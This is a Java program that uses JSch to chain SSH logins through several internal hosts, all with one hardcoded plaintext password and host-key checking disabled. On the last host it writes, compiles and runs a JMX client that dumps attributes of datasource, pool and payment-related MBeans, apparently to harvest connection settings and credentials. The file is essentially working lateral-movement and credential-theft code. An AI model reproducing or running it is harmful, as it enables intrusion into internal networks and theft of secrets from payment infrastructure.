import com.jcraft.jsch.*;
import java.io.*;
class JMX {
  public static void main(String[] a) throws Exception {
    JSch j = new JSch();
    java.util.Properties p = new java.util.Properties();
    p.put("StrictHostKeyChecking", "no");
    Session s1 = j.getSession("user", "10.14.36.23", 22);
    s1.setPassword("kutul0nc4t");
    s1.setConfig(p);
    s1.setTimeout(10000);
    s1.connect();
    int fwd1 = s1.setPortForwardingL(0, "10.13.16.117", 22);
    Session s2 = j.getSession("user", "127.0.0.1", fwd1);
    s2.setPassword("kutul0nc4t");
    s2.setConfig(p);
    s2.setTimeout(8000);
    s2.connect();
    ChannelExec ch = (ChannelExec) s2.openChannel("exec");
    // From NEO server: connect to JMX and dump DataSource MBeans
    ch.setCommand("sshpass -p kutul0nc4t ssh -o StrictHostKeyChecking=no user@10.13.16.196 'cd /tmp;echo \"import javax.management.*;import javax.management.remote.*;import java.util.*;class JX{public static void main(String[] a)throws Exception{JMXServiceURL u=new JMXServiceURL(\\\"service:jmx:rmi:///jndi/rmi://localhost:9005/jmxrmi\\\");JMXConnector c=JMXConnectorFactory.connect(u);MBeanServerConnection m=c.getMBeanServerConnection();System.out.println(\\\"CONNECTED to JMX!\\\");Set<ObjectName> beans=m.queryNames(null,null);for(ObjectName b:beans){String n=b.toString();if(n.toLowerCase().contains(\\\"datasource\\\")||n.toLowerCase().contains(\\\"pool\\\")||n.toLowerCase().contains(\\\"xendit\\\")||n.toLowerCase().contains(\\\"payment\\\")){System.out.println(\\\"BEAN: \\\"+n);MBeanInfo info=m.getMBeanInfo(b);for(MBeanAttributeInfo attr:info.getAttributes()){try{Object v=m.getAttribute(b,attr.getName());if(v!=null&&v.toString().length()<500)System.out.println(\\\"  \\\"+attr.getName()+\\\"=\\\"+v);}catch(Exception e){}}}}c.close();}}\" > JX.java;/usr/lib/jvm/java-1.8.0-amazon-corretto/bin/javac JX.java 2>&1;/usr/lib/jvm/java-1.8.0-amazon-corretto/bin/java JX 2>&1' 2>&1 | head -50");
    ch.setInputStream(null);
    InputStream in = ch.getInputStream();
    ch.connect();
    byte[] buf = new byte[32768];
    int i;
    while ((i = in.read(buf)) != -1) System.out.write(buf, 0, i);
    ch.disconnect();
    s2.disconnect();
    s1.disconnect();
  }
}
